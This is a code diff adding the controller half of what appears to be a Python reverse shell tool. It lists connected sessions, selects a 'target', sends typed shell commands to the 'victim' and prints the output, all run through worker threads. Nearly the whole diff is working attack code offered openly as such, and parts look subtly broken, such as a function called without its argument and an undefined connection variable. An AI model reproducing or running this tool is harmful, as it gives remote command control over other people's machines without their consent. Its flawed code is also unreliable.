@@ -78,3 +78,70 @@ def intarface():
 			session_connect()
 		elif op_listen == "help":
 			help_menu()
+		else:
+			print(f"  {c}[{r}!{c}] {y}command not find {r}:{v} {op_listen}")
+'''creating a list os every session'''
+def session_list():
+	result = ""
+	for i , conn in enumerate(all_connection):
+		try:
+			msg = ""
+			conn.send(str(msg).encode("utf-8"))
+			conn.recv(1024)
+		except s.error as error:
+			del all_connection[i]
+			del address_connection[conn]
+		result = [f"{y}session number",f"{y}IP",f"{y}PORT"],[f"{r}{str(i)}",f"{r}str{address_connection[i][0]}",f"{r}{address_connection[i][1]}"]
+	print(tabulate(result, headers="firstrow",tablefmt="grid"))
+'''connecting to the targets'''
+def session_connect(op_listen):
+	try:
+		print(f"  {c}[{g}!{c}] {y}Trying to connecting to {v}>> {r} {str(address_connection[0:])}")
+		time.sleep(1)
+		target = op_listen.replace("connect ","")
+		target = int(target)
+		conn = all_connection[target]
+		time.sleep(2)
+		print(f"  {c}[{g}+{c}] {g} you are now connected to {v}>>{r} {address_connection[0:]}",end="")
+	except s.error as error:
+		print(f"  {c}[{r}-{c}] {y}Could not to connect to  {v}>> {r}{address_connection[0:]}")
+'''sending commands to the victim'''
+def send_command():
+	while True:
+		try:
+			msg_command = input(f"  {c}${r}> {g}")
+			if msg_command == "quit session":
+				break
+			if len(str.encode(msg_command)):
+				conn.send(str.encode(msg_command))
+				client_response = str(conn.recv(1024), "utf-8")
+				print(client_response, end="")
+		except:
+			print(f"  {c}[{r}?{c}] {y}Connection lost to the target")
+			break
+'''creat some thread'''
+def workers():
+	for _ in range(NUMBER_OF_THREAD):
+		t = threading.Thread(target=work)
+		t.daemon = True
+		t.start()
+'''creat queue work'''
+def work():
+	while True:
+		x = queue.get()
+		if x == 1:
+			connection_info()
+			connection_bind()
+			conection_accept()
+		elif x == 2:
+			intarface()
+		queue.task_done()
+'''jobs for threads'''
+def jobs():
+	for x in JOB_NUMBER	:
+		queue.put(x)
+	queue.join()
+'''executing all this function'''
+def reverse_shell_exec():
+	workers()
+	jobs()
